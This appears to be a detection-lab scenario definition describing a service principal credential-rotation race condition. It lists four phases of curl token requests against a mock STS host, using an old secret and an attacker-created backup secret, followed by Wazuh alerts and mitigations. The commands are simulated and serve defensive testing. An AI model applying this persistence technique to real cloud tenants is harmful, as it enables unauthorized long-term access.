name: Service Principal Credential Rotation Race Condition
description: Attacker exploits the timing window during service principal credential rotation to maintain access using old credentials and create backup credentials before the rotation completes
real_world_relevance: Azure AD service principal rotation gaps exploited by APT29, race conditions in AWS IAM key rotation allowing dual-key persistence, Kubernetes service account token rotation gaps

attack_flow.description: Attacker monitors service principal credential rotation and exploits the window where both old and new credentials are valid to create backup credentials for persistence
diagram: 1. Attacker has access to service principal credentials (obtained via earlier compromise)
2. Monitor for credential rotation events (new secret added to SP)
3. Use old credential during rotation window before it is revoked
4. Create an additional client secret on the service principal
5. Maintain persistence via the backup credential after rotation completes

phases.name: Credential Rotation Monitoring
phases.description: Detect credential rotation in progress on the service principal

actions.command: curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=production-service-principal&client_secret=old-credential-being-rotated&scope=https://management.azure.com/.default' 2>/dev/null | python3 -m json.tool || echo 'Old credential still valid during rotation window'
actions.description: Test if old credential is still accepted during rotation window

phases.name: Race Condition Exploitation
phases.description: Use old credential during rotation window to authenticate

actions.command: curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=production-service-principal&client_secret=old-credential-being-rotated&scope=https://graph.microsoft.com/.default' 2>/dev/null | python3 -m json.tool || echo 'Race condition token request'
actions.description: Authenticate with old credential during rotation window

phases.name: Backup Credential Creation
phases.description: Create additional client secret on the service principal for persistence

actions.command: curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=production-service-principal&client_secret=attacker-created-backup-secret&scope=Application.ReadWrite.All&action=addPassword' 2>/dev/null | python3 -m json.tool || echo 'Backup credential creation attempted'
actions.description: Create additional SP secret for persistence via backup credential

phases.name: Persistence Verification
phases.description: Verify persistent access via the backup credential

actions.command: curl -s -X POST http://mock-sts-federation:8091/oauth2/v2.0/token -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials&client_id=production-service-principal&client_secret=attacker-created-backup-secret&scope=https://management.azure.com/.default' 2>/dev/null | python3 -m json.tool || echo 'Backup credential verification'
actions.description: Authenticate with backup credential to verify persistent access

indicators_of_compromise.description: Service principal credential created during rotation window

expected_wazuh_alerts.description: NHI: Service principal credential created during rotation window

immediate: Audit all credentials on the affected service principal and remove unauthorized ones
Immediately revoke old credentials rather than allowing grace periods
Review Azure AD audit logs for addPassword operations during rotation windows
long_term: Implement zero-downtime rotation with immediate old credential revocation
Monitor for addPassword and addKey operations on service principals
Use managed identities or workload identity federation instead of client secrets
Implement alerts on multiple valid credentials for a single service principal

references.title: Azure AD Service Principal Security Best Practices
